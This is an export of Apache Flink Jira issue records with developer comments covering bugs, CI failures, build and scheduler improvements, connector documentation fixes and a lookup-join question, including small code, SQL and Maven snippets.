 ",,,,,,,,,,,,,,,,,,FLINK-32897,FLINK-31778,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Oct 25 10:01:26 UTC 2023,,,,,,,,,,"0|z1iftc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jun/23 02:30;libenchao;[~qingwei91] Thanks for reporting the issue, have you tried on current master branch?;;;","01/Jul/23 00:13;Sergey Nuyanzin;The root cause is {{{}RowToRowCastRule{}}}. Since it was introduced in 1.15.0 at FLINK-25052 it could work for 1.14.x.

During code gen it generates something like
{code:java}
...
for (int i$13 = 0; i$13 < array$7.size(); i$13++) {
...
   writer$17.reset();
...
   result$15 = row$16;
...
   objArray$12[i$13] = result$15;
...
}
...
{code}
where {{result$15}} - item of array and in case of row it is passed by reference, and then overridden by other values in next iterations.
Finally every element of array references to the latest source array element.
Thus if we look at example and especially at last element of every array from {{bug_data}} in description there are only two different elements. That explains why it gives currently 2 elements instead of 5.

Same problem is for maps with size more than 1 where key or value is row

so the idea of fix just use \{{copy}} method of {{RowBinaryData}};;;","01/Jul/23 00:22;Sergey Nuyanzin;[~qingwei91] could you please double check that this fix fixes the problem?;;;","08/Jul/23 07:55;qingwei91;Hi [~Sergey Nuyanzin] , I am not able to build your branch locally. Is there any alternative to test it?

I am getting this error when trying to build

 

> Failed to execute goal org.apache.rat:apache-rat-plugin:0.13:check (default) on project flink-parent: Too many files with unapproved license: 1 See RAT report

 ;;;","08/Jul/23 08:47;Sergey Nuyanzin;[~qingwei91] this error means that you have some other files without license in header.
Are you sure you don't have other changes which are not part of this PR? 
by the way you can use this command
{noformat}
./mvnw -DskipTests -Dfast -Pskip-webui-build install
{noformat}

it will skip such checks;;;","17/Jul/23 10:22;qingwei91;Hi [~Sergey Nuyanzin] , sorry for the long response time.

I finally got around to test it, and I can confirm it fixes the issue in my test case.

Thanks a lot for the fix!

I suppose we will need someone to review and merge the change? Looks fairly small but I dont have enough knowledge to understand it.;;;","08/Aug/23 14:27;Christian.Lorenz77;Hi [~qingwei91] and [~Sergey Nuyanzin], we also seem to hit this issue using flink 1.17.1. I was able to reproduce it and also fix it with the pr changes proposed by [~Sergey Nuyanzin]. 
Is there a chance that this fix will be added to 1.17.2?;;;","23/Aug/23 18:52;Sergey Nuyanzin;Merged to master as [6d62f9918ea2cbb8a10c705a25a4ff6deab60711|https://github.com/apache/flink/commit/6d62f9918ea2cbb8a10c705a25a4ff6deab60711]

1.16: [4d593cdb3fb0e989065437ab3ed6430a7ea2075e|https://github.com/apache/flink/commit/4d593cdb3fb0e989065437ab3ed6430a7ea2075e]
1.17: [ac77023c09002728c15da564a88039e638dd412d|https://github.com/apache/flink/commit/ac77023c09002728c15da564a88039e638dd412d];;;","24/Aug/23 01:53;renqs;[~Sergey Nuyanzin] I think we also need to cherry-pick the patch to the release-1.18 branch;;;","24/Aug/23 06:42;Sergey Nuyanzin;[~renqs] agree and also think so
in fact the back port PR [1] was already present for 1.18 branch however yesterday it was still in ci processing
will merge it today

[1] https://github.com/apache/flink/pull/23273;;;","24/Aug/23 06:53;Sergey Nuyanzin;1.18: [8715f0a1e8c3bb6595d26c69ef4ef246486d187d|https://github.com/apache/flink/commit/8715f0a1e8c3bb6595d26c69ef4ef246486d187d];;;","25/Oct/23 10:01;qingyue;Encountered the same problem, and the fix worked! Thanks [~Sergey Nuyanzin] (y);;;",,,,,,,,,,,
Try out Infra-provided Gradle Enterprise,FLINK-32295,13539393,,Technical Debt,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,chesnay,chesnay,chesnay,09/Jun/23 08:58,09/Jun/23 08:58,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Build System / CI,,,,0,,,,"Infra has a Gradle Enterprise instance that can be used for Github Action branch builds (not PRs). We could try this out in one of the connector repos to see if it provides value to us; if so rolling this out to all connector/auxiliary repos could be interesting.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-09 08:58:48.0,,,,,,,,,,"0|z1ifsw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The CI fails due to HiveITCase,FLINK-32294,13539354,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,yuxia,fanrui,fanrui,09/Jun/23 02:28,02/Nov/23 13:46,04/Jun/24 20:41,09/Jun/23 02:52,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Hive,,,,0,pull-request-available,,,"2 ITCases fail:
 * HiveITCase.testHiveDialect
 * HiveITCase.testReadWriteHive

[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49766&view=logs&j=ef799394-2d67-5ff4-b2e5-410b80c9c0af&t=9e5768bc-daae-5f5f-1861-e58617922c7a&l=14346]

 

[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49766&view=logs&j=af184cdd-c6d8-5084-0b69-7e9c67b35f7a&s=ae4f8708-9994-57d3-c2d7-b892156e7812&t=0f3adb59-eefa-51c6-2858-3654d9e0749d&l=14652]

 

 ",,,,,,,,,,,,,,,,,,,,FLINK-32291,,,,,,,,FLINK-33438,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 03:04:51 UTC 2023,,,,,,,,,,"0|z1ifk8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 02:31;fanrui;Hi [~yuxia] , I'm working on FLINK-30585[1], it's related to flame graph, and shouldn't affect the HiveITCase. However, these 2 ITCases fail twice.
 * HiveITCase.testHiveDialect
 * HiveITCase.testReadWriteHive

Would you mind help take a look in your free time? thanks~

  [1] https://github.com/apache/flink/pull/22552;;;","09/Jun/23 02:50;luoyuxia;[~fanrui] Thanks for reporting. ;;;","09/Jun/23 02:52;luoyuxia;master: eacd5c1d90c98349a35c25dc420eb59eec7bf698

[~fanrui] Should be fixed. You can try to rebase master again. Sorry for that.;;;","09/Jun/23 03:04;fanrui;Thanks a lot for your quick feedback, let me try it now.:);;;",,,,,,,,,,,,,,,,,,,
Support vector with long index,FLINK-32293,13539350,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,zhangzp,zhangzp,09/Jun/23 01:41,06/Oct/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Library / Machine Learning,,,,0,pull-request-available,stale-major,,"Currently in Flink ML, we only support sparse and dense vector with `int` as index and `double` as value.

 

However, there are real-world cases that the index of a vector could exceed the range of `INT.MAX`. Thus we need to support vector with `long` index.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Oct 06 22:35:02 UTC 2023,,,,,,,,,,"0|z1ifjc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"06/Oct/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;",,,,,,,,,,,,,,,,,,,,,,
TableUtils.getRowTypeInfo fails to get type information of Tuple,FLINK-32292,13539349,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,zhangzp,zhangzp,zhangzp,09/Jun/23 01:28,09/Jun/23 02:17,04/Jun/24 20:41,09/Jun/23 02:17,,,,,,,,,,,,,,,,,,,,,Library / Machine Learning,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 02:17:29 UTC 2023,,,,,,,,,,"0|z1ifj4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 02:17;lindong;Merged to apache/flink-ml master branch 0b6b7f70e45bebfa5f66e9405f152031607bc45a;;;",,,,,,,,,,,,,,,,,,,,,,
Hive E2E test fails consistently,FLINK-32291,13539307,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Duplicate,,chesnay,chesnay,08/Jun/23 15:55,09/Jun/23 03:15,04/Jun/24 20:41,09/Jun/23 03:15,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Connectors / Hive,Tests,,,0,,,,https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49754&view=results,,,,,,,,,,,,,,,,,,FLINK-32294,,,FLINK-30660,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 09 03:15:37 UTC 2023,,,,,,,,,,"0|z1if9s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"09/Jun/23 03:15;fanrui;It's duplicated with FLINK-32294, and it has been fixed. So close this Jira.;;;",,,,,,,,,,,,,,,,,,,,,,
Enable -XX:+IgnoreUnrecognizedVMOptions,FLINK-32290,13539284,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,08/Jun/23 13:47,15/Jun/23 10:52,04/Jun/24 20:41,15/Jun/23 10:52,,,,,,,,,,,,,,,1.18.0,,,,,,API / Python,Build System,Deployment / YARN,,0,pull-request-available,,,"We can make our lives a lot easier by enabling {{IgnoreUnrecognizedVMOptions}} for all processes. With this we can set add-opens/add-exports independent of what JDK is actually being used, removing a major source of complexity.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 10:52:26 UTC 2023,,,,,,,,,,"0|z1if4o:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"15/Jun/23 10:52;chesnay;master: c0dab74002b2433ed33c130764bacfada3913b97;;;",,,,,,,,,,,,,,,,,,,,,,
The metadata column type is incorrect in Kafka table connector example,FLINK-32289,13539226,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,xiqian_yu,leonard,leonard,08/Jun/23 09:10,25/Jan/24 21:57,04/Jun/24 20:41,13/Jun/23 14:11,1.15.4,1.16.2,1.17.1,,,,,,,,,,,,1.18.0,kafka-3.1.0,,,,,Connectors / Kafka,,,,0,pull-request-available,,,"The example[1] defined ts column with TIMESTAMP type

 
{code:java}
  `ts` TIMESTAMP(3) METADATA FROM 'timestamp'
{code}
the correct column type should be TIMESTAMP_LTZ type.

 
{code:java}
 `ts` TIMESTAMP_LTZ(3) METADATA FROM 'timestamp'  {code}
 

[1] https://nightlies.apache.org/flink/flink-docs-release-1.15/docs/connectors/table/kafka/#how-to-create-a-kafka-table",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 13 14:10:43 UTC 2023,,,,,,,,,,"0|z1iers:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/Jun/23 09:46;xiqian_yu;I'm glad to take this ticket.;;;","13/Jun/23 14:10;leonard;Fixed in：

flink(master)： 5326cb4528a02ecbe8f68ff1ece31e9305050162
flink-connector-kafka(main): aee4e82397af082e0463ffc156ae215132aa2b57

 ;;;",,,,,,,,,,,,,,,,,,,,,
Improve the scheduling performance of AdaptiveBatchScheduler,FLINK-32288,13539224,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,xiasun,xiasun,xiasun,08/Jun/23 09:05,20/Jun/23 03:12,04/Jun/24 20:41,20/Jun/23 03:12,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"After adding the benchmark of AdaptiveBatchScheduler in FLINK-30480, we noticed a regression in the performance of SchedulingDownstreamTasksInBatchJobBenchmark#SchedulingDownstreamTasks. When scheduling a batch job with a parallelism of 4000*4000, the time spent increased from 32ms to 1336ms on my local PC.

To improve the performance, we can optimize the traversal by checking if the consumedPartitionGroups have finished all its partitions.",,,,,,,,,,,,,,,,,,FLINK-32306,,,,,,,,FLINK-30480,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 20 03:12:27 UTC 2023,,,,,,,,,,"0|z1ierc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/Jun/23 09:27;zhuzh;Thanks for reporting this! [~xiasun]
The root cause is that the VertexwiseSchedulingStrategy used by AdaptiveBatchScheduler is less performant than the PipelinedRegionSchedulingStrategy used by DefaultScheduler. But given that AdaptiveBatchScheduler is the recommended and default scheduler for batch jobs, we should use it to benchmark the batch job scheduling.
I have assigned you the ticket. Feel free to open a PR for it.;;;","20/Jun/23 03:12;zhuzh;done via b462d0ec4d1d421a369e45f8dca33284b5be6bc2;;;",,,,,,,,,,,,,,,,,,,,,
Add doc for truncate table statement,FLINK-32287,13539202,13533474,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,ruanhang1993,luoyuxia,luoyuxia,08/Jun/23 07:27,10/Aug/23 01:38,04/Jun/24 20:41,10/Aug/23 01:38,,,,,,,,,,,,,,,1.18.0,,,,,,Documentation,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 01:38:04 UTC 2023,,,,,,,,,,"0|z1iemg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 09:58;ruanhang1993;I would like to help. Please assign this to me. Thanks.;;;","10/Aug/23 01:38;luoyuxia;2eb88b4115f0a4df9290b6f0c81bf18b41cd594a;;;",,,,,,,,,,,,,,,,,,,,,
Align the shade pattern that Hive connector using for calcite related class  with flink-table-planner,FLINK-32286,13539197,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,luoyuxia,luoyuxia,08/Jun/23 07:13,08/Jun/23 07:14,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Connectors / Hive,,,,0,,,,"After FLINK-31413, hive-connector will only have flink-table-calcite-bridge provided dependency and 
flink-table-planner test dependency. But in flink-table-planner, it'll shade com.google.xx to org.apache.flink.calcite.shaded.com.google.xx.

Then it'll result in we compile hive-connector against com.google, but actuall run against org.apache.flink.calcite.shaded.com.google provided by flink-table-planner.

It'll bring much pain while developing hive connector. We may need to introduce a new moulde named flink-hive-table-calcite-bridge to wrap flink-table-calcite-bridge to do same shadding to flink-table-planner, and then make flink-connector dependend on flink-hive-table-calcite-bridge. 

 Remember this should be done after FLINK-30064 in which we'll migrate hive connector to a dedicated repo, and introduce the wrapper module to the dedicated repo.",,,,,,,,,,FLINK-30064,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-08 07:13:27.0,,,,,,,,,,"0|z1ielc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support multiple Flink versions in each Flink ML Java library release,FLINK-32285,13539183,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,Jiang Xin,Jiang Xin,Jiang Xin,08/Jun/23 04:49,10/Jun/23 01:00,04/Jun/24 20:41,10/Jun/23 01:00,ml-2.3.0,,,,,,,,,,,,,,ml-2.3.0,,,,,,Library / Machine Learning,,,,0,pull-request-available,,,Support Flink ML being built with different versions of Flink to run on various versions of Flink clusters (at least the latest few stable versions).,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jun 10 00:59:01 UTC 2023,,,,,,,,,,"0|z1iei8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jun/23 00:59;lindong;Merged to apache/flink-ml master branch

d38ce365e52cf658bd989624fd18c6278e60f38e

bb13b73fae8f9b89d2bca5100729dda7b8d0c35c

 ;;;",,,,,,,,,,,,,,,,,,,,,,
"When using session windows, the state of slot 1 keeps growing",FLINK-32284,13539176,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,leen,leen,08/Jun/23 03:16,08/Jun/23 06:08,04/Jun/24 20:41,08/Jun/23 06:08,1.14.4,,,,,,,,,,,,,,,,,,,,API / DataStream,,,,0,,,,"This will happen no matter how much parallelism  I set, and it will always be in slot id 1.

I have set different parallelism (50/100/120/140).

The amount of data received is about the same as other slots, but the state is much larger and growing.

The same code is running normally in the test environment (parallelism is 10).

 

Thank you for your help~",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jun/23 03:20;leen;Checkpoint Details.png;https://issues.apache.org/jira/secure/attachment/13058864/Checkpoint+Details.png","08/Jun/23 03:20;leen;Window Function Received Details.png;https://issues.apache.org/jira/secure/attachment/13058863/Window+Function+Received+Details.png",,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 08 06:07:37 UTC 2023,,,,,,,,,,"0|z1iego:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"08/Jun/23 06:07;leen;it is the data problem, not a bug, thks;;;",,,,,,,,,,,,,,,,,,,,,,
Implement SortBufferAccumulator,FLINK-32283,13539173,13530330,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,tanyuxin,tanyuxin,tanyuxin,08/Jun/23 02:54,18/Sep/23 06:15,04/Jun/24 20:41,29/Jun/23 02:48,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Network,,,,0,pull-request-available,,,We should implement the sort-based buffer accumulator to decouple the memory usage from the parallelism.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 02:48:26 UTC 2023,,,,,,,,,,"0|z1ieg0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 02:48;Weijie Guo;master(1.18) via 7466df0c3c52851b7b1b9bca9c441dda22d66d2f.;;;",,,,,,,,,,,,,,,,,,,,,,
Use kubernetes-webhooks-framework instead of deprecated admission control,FLINK-32282,13539088,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,gyfora,gyfora,gyfora,07/Jun/23 13:12,19/Jul/23 08:13,04/Jun/24 20:41,19/Jul/23 08:13,,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,The admission controller framework name has been deprecated and replaced by the webhook framework in josdk. We should migrate to it.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 19 08:13:57 UTC 2023,,,,,,,,,,"0|z1idx4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"19/Jul/23 08:13;gyfora;merged to main 142781232c42904d877712a5595669a0fe962390;;;",,,,,,,,,,,,,,,,,,,,,,
Enable two-phase HashAgg default when agg function support adaptive local HashAgg,FLINK-32281,13539078,13532997,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,lsy,lsy,07/Jun/23 11:53,30/Jun/23 04:14,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"For the HashAgg operator, planner currently prefers a one-phase agg when the statistic cannot be accurately estimated. In some queries of production scenarios, it may be more reasonable to choose a two-phase agg. In the TPC-DS cases, we find that for some patterns actually choosing two-stage agg, the query runtime is significantly reduced. In https://issues.apache.org/jira/browse/FLINK-30542 , we have introduced the adaptive local hashagg, which can adaptively skip aggregation when the local phase aggregation degree is relatively low, which can greatly improve the performance of two-phase aggregation in some queries. Based on the above background, in this issue, we propose to turn on two-phase agg by default for functions that support adaptive local hashagg, such as sum/count/min/max, etc., so as to exploit the ability of adpative local hashgg to improve the performance of agg query. For OFCG, if we turn on two-phaseagg by default, we can also let the local agg operator be put into the fused operator, so as to enjoy the benefit from OFCG.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-07 11:53:22.0,,,,,,,,,,"0|z1iduw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
HashAgg support operator fusion codegen,FLINK-32280,13539077,13532997,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lsy,lsy,lsy,07/Jun/23 11:51,22/Jul/23 15:49,04/Jun/24 20:41,22/Jul/23 15:49,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jul 22 15:49:44 UTC 2023,,,,,,,,,,"0|z1iduo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Jul/23 15:49;jark;Fixed in master: f500b59391161409fc8fb909db0744068975269d...6fd47ec7cbfad295d4430f85624fc1b14e215b10;;;",,,,,,,,,,,,,,,,,,,,,,
Shuffle HashJoin support spill to disk when enable operator fusion codegen,FLINK-32279,13539075,13532997,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lsy,lsy,lsy,07/Jun/23 11:51,23/Jul/23 09:21,04/Jun/24 20:41,23/Jul/23 09:21,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 09:21:08 UTC 2023,,,,,,,,,,"0|z1idu8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 09:21;jark;Fixed in master: bff837622ddfd2cc8ee2f605eea953c7bbf0cb4b and a0a66d7039883c23e49f1069d860b65fe0f6b530;;;",,,,,,,,,,,,,,,,,,,,,,
HashJoin support operator  fusion codegen,FLINK-32278,13539074,13532997,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lsy,lsy,lsy,07/Jun/23 11:50,12/Jul/23 14:55,04/Jun/24 20:41,12/Jul/23 14:54,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 12 14:54:49 UTC 2023,,,,,,,,,,"0|z1idu0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jul/23 14:54;jark;Fixed in master with 6040f480aae92f5449eb548a9eb3e042442b2bbb and f03c26a6f0189b78975828dc77482e5ba1e53641;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce operator fusion codegen basic framework,FLINK-32277,13539073,13532997,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,lsy,lsy,lsy,07/Jun/23 11:48,12/Jul/23 14:55,04/Jun/24 20:41,12/Jul/23 14:55,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 12 14:55:55 UTC 2023,,,,,,,,,,"0|z1idts:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jul/23 14:55;jark;Fixed in master: 02be55ab780186a4b738a331e17c436ad2543de3 and 1f062a38f43cdc9fdbaab3c68e1ec1c1ffdb88b5;;;",,,,,,,,,,,,,,,,,,,,,,
"After adding the where condition to the flink lookup left join, the joinType becomes innerJoin",FLINK-32276,13539050,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Not A Bug,,yesorno,yesorno,07/Jun/23 09:32,27/Jun/23 02:21,04/Jun/24 20:41,27/Jun/23 02:21,1.17.1,,,,,,,,,,,,,,,,,,,,Connectors / JDBC,,,,0,,,,"*How to reproduce:*
{code:java}
CREATE TABLE dim (
  id BIGINT,
  name STRING,
  age INT,
  status BOOLEAN,
  PRIMARY KEY (id) NOT ENFORCED
) WITH (
  'connector' = 'jdbc',
  'url' = 'jdbc:mysql://localhost:3306/mydatabase',
  'table-name' = 'users'
);

create table actions (
  id bigint,
  proc as proctime(),
  primary key (id) not enforced
) with (
  'connector' = 'jdbc',
  'url' = 'jdbc:mysql://localhost:3306/mydatabase',
  'table-name' = 'actions'
);

select
  *
from
  actions
  left join dim for system_time as of actions.proc on actions.id = dim.id
where
  dim.age > 10; {code}
When running the above SQL, the LookupJoin operator is executed based on InnerJoin, contrary to the SQL's left join.

If I remove the where condition(dim.age>10), the LookupJoin's joinType is LeftOuterJoin.

